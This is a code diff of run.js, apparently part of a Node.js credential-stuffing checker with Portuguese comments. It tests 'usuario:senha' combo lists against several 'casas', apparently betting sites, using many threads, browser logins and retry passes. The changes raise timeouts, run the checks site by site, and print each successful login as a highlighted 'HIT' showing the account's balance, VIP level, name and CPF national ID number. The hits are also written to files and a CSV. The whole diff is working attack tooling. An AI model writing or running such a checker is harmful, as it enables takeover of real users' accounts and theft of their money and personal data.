@@ -1,4 +1,4 @@
-// run.js v11 — timeout por conta, watchdog, HIT só com dado real + branding Nlucky, deepCheck, HTML, Q/parar.js
+// run.js v14 — esteira por casa, browser por dominio, HIT destacado, watchdog, relatorio
 import fs from "fs";
 import path from "path";
 import { exec } from "child_process";
@@ -10,17 +10,21 @@ import { fullCheck } from "./login.js";
 import { setRateLimit } from "./trpc.js";
 import { runPool } from "./pool.js";
 import { banner, prompt, separator, c } from "./ui.js";
-import { sendDesktopNotification } from "./notification.js";
+import * as notificacao from "./notification.js";
 import { verificarBonus } from "./deepCheck.js";
 import { iniciarRelatorio, registrar, finalizarRelatorio } from "./report.js";
 import { criarParada } from "./stop.js";
+import { fecharBrowser } from "./browser.js";
+
+const sendDesktopNotification =
+  notificacao.sendDesktopNotification || notificacao.notificar || notificacao.default || (() => {});
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
 // ── prazos ───────────────────────────────────────────────────────────────
-const LIMITE_CHECK = 75000;   // conta inteira
+const LIMITE_CHECK = 150000;   // conta inteira
 const LIMITE_BONUS = 25000;   // deepCheck
-const LIMITE_TRAVA = 120000;  // watchdog: sem progresso real
+const LIMITE_TRAVA = 180000;  // watchdog: sem progresso real
 const INTERVALO_SOM = 3000;   // anti-tempestade de powershell
 
 class TimeoutConta extends Error {}
@@ -160,7 +164,7 @@ export async function cmdRun() {
   }
 
   const threadsStr = await prompt(`  Threads ${c.DIM}[${config.threads}]${c.RESET}: `);
-  const threads = Math.min(50, Math.max(1, parseInt(threadsStr || config.threads, 10) || 1));
+  let threads = Math.min(50, Math.max(1, parseInt(threadsStr || config.threads, 10) || 1));
   const delayStr = await prompt(`  Delay entre requisições em ms ${c.DIM}[${config.delay || 90}]${c.RESET}: `);
   const delay = Math.max(0, parseInt(delayStr || config.delay || 90, 10) || 0);
   const repescagemStr = await prompt(`  Passadas de repescagem ${c.DIM}[2]${c.RESET}: `);
@@ -168,6 +172,16 @@ export async function cmdRun() {
   const filtroStr = await prompt(`  Só números com 9 no 3º dígito ${c.DIM}[${config.filtro9 ? "S" : "n"}]${c.RESET}: `);
   const filtro9 = (filtroStr || (config.filtro9 ? "s" : "n")).toLowerCase() !== "n";
   const arquivo = (await prompt(`  Arquivo de contas ${c.DIM}[contas.txt]${c.RESET}: `)) || path.join(ROOT, "contas.txt");
+
+  // login por browser é limitado pelo número de abas
+  const casasComBrowser = alvo.filter((n) => casas[n].browserLogin).length;
+  if (casasComBrowser) {
+    const abas = Math.max(4, Number(casas[alvo[0]]?.browserPages) || 8);
+    if (threads > abas) {
+      console.log(`  ${c.YELLOW}⚠ ${threads} threads com ${abas} abas — usando ${abas}${c.RESET}`);
+      threads = abas;
+    }
+  }
 
   if (!fs.existsSync(arquivo)) {
     fs.writeFileSync(arquivo, "usuario:senha\n");
@@ -251,7 +265,7 @@ export async function cmdRun() {
 
   const parada = criarParada(() => draw(stats, { done: concluidas, total: totalGeral, parado: true }, true));
 
-  // ── watchdog: se nada concluir em LIMITE_TRAVA, solta o pool ────────────
+  // ── watchdog ────────────────────────────────────────────────────────────
   let marcaConcluidas = concluidas;
   let marcaTempo = Date.now();
   const vigia = setInterval(() => {
@@ -342,7 +356,6 @@ export async function cmdRun() {
         const bonus = report.bonus;
         const temDado = report.saldo !== null || report.vip !== null;
 
-        // ── login ok mas perfil não respondeu: inconclusivo, não HIT ─────
         if (report.status === "LOGIN_OK" && !temDado) {
           stats.unk++;
           resultados.set(chave, "INCONCLUSIVO");
@@ -377,7 +390,12 @@ export async function cmdRun() {
 
             if (relevante && !proibida) {
               stats.hits++;
-              log(`${c.GREEN}[✅ HIT]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}${semBonus}`);
+              const larg = 52;
+              log(`${c.GREEN}┌─ HIT ${"─".repeat(Math.max(0, larg - 6))}${c.RESET}`);
+              log(`${c.GREEN}│${c.RESET} ${c.B}${report.conta}${c.RESET} ${c.DIM}·${c.RESET} ${nome}`);
+              log(`${c.GREEN}│${c.RESET} vip ${c.MAGENTA}${vip}${c.RESET} ${c.DIM}·${c.RESET} saldo ${c.GREEN}${saldoTxt}${c.RESET}${report.nome ? ` ${c.DIM}·${c.RESET} ${report.nome}` : ""}${semBonus}`);
+              if (report.cpf) log(`${c.GREEN}│${c.RESET} ${c.DIM}cpf ${report.cpf}${c.RESET}`);
+              log(`${c.GREEN}└${"─".repeat(larg)}${c.RESET}`);
               appendSafe(hitsFile, `${report.conta} | ${vip} | saldo=${saldoTxt}\n`);
               appendSafe(
                 csvFile,
@@ -402,8 +420,8 @@ export async function cmdRun() {
         } else {
           const bucket = CLASS_TO_BUCKET[report.status] || "unk";
           stats[bucket]++;
-          if (bucket === "unk") log(`${c.DIM}[? ${report.status}] ${nome} │ ${report.conta} │ ${report.detalhe}${c.RESET}`);
-          if (bucket === "err") log(`${c.R}[💥 ${report.status}]${c.RESET} ${nome} │ ${report.conta} │ ${report.detalhe}`);
+          const cor = bucket === "err" ? c.R : bucket === "unk" ? c.YELLOW : c.DIM;
+          log(`${cor}[${report.status}]${c.RESET} ${nome} │ ${report.conta}${report.detalhe ? ` │ ${report.detalhe}` : ""}`);
         }
 
         resultados.set(chave, report.status);
@@ -438,29 +456,37 @@ export async function cmdRun() {
   }
 
   try {
-    await executarPassada(pares, threads, delay, 0);
-
-    for (let passe = 1; passe <= repescagens; passe++) {
+    for (const nomeCasa of alvo) {
       if (deveParar()) break;
+      const paresCasa = pares.filter((p) => p.nome === nomeCasa);
+      if (!paresCasa.length) continue;
 
-      const pendentes = pares.filter((p) => RETRY_STATUS.has(resultados.get(`${p.nome}|${p.conta}`)));
-      if (pendentes.length === 0) break;
+      process.stdout.write(`\u001b[4;1H\u001b[K  ${c.ACCENT2}▶ casa ${nomeCasa}${c.RESET} ${c.DIM}(${paresCasa.length} contas)${c.RESET}\n`);
+      await executarPassada(paresCasa, threads, delay, 0);
 
-      pendentesAtual = pendentes.length;
-      const espera = 4000 + passe * 3000;
-      process.stdout.write(`\u001b[4;1H\u001b[K  ${c.YELLOW}↻ Repescagem ${passe}/${repescagens}: ${pendentes.length} pendentes — aguardando ${Math.round(espera / 1000)}s${c.RESET}\n`);
-      await sleep(espera);
-      if (deveParar()) break;
+      for (let passe = 1; passe <= repescagens; passe++) {
+        if (deveParar()) break;
+        const pendentes = paresCasa.filter((p) => RETRY_STATUS.has(resultados.get(`${p.nome}|${p.conta}`)));
+        if (!pendentes.length) break;
 
-      for (const p of pendentes) {
-        const st = resultados.get(`${p.nome}|${p.conta}`);
-        const b = CLASS_TO_BUCKET[st];
-        if (b && stats[b] > 0) stats[b]--;
+        pendentesAtual = pendentes.length;
+        const espera = 4000 + passe * 3000;
+        process.stdout.write(`\u001b[4;1H\u001b[K  ${c.YELLOW}↻ Repescagem ${passe}/${repescagens} (${nomeCasa}): ${pendentes.length} pendentes${c.RESET}\n`);
+        await sleep(espera);
+        if (deveParar()) break;
+
+        for (const p of pendentes) {
+          const b = CLASS_TO_BUCKET[resultados.get(`${p.nome}|${p.conta}`)];
+          if (b && stats[b] > 0) stats[b]--;
+        }
+
+        const tRetry = Math.max(1, Math.min(threads, 8));
+        const dRetry = Math.max(delay, 150 + passe * 120);
+        await executarPassada(pendentes, tRetry, dRetry, passe);
       }
 
-      const tRetry = Math.max(1, Math.min(threads, 8));
-      const dRetry = Math.max(delay, 150 + passe * 120);
-      await executarPassada(pendentes, tRetry, dRetry, passe);
+      await fecharBrowser();
+      pendentesAtual = 0;
     }
   } catch (e) {
     falhas.push(`[pool] ${e.message}`);
@@ -507,4 +533,6 @@ export async function cmdRun() {
   }
   console.log(`  📄 CSV: ${csvFile}`);
   console.log(`  📁 Hits por casa em: ${hitsDir}\n`);
+
+  await fecharBrowser();
 }
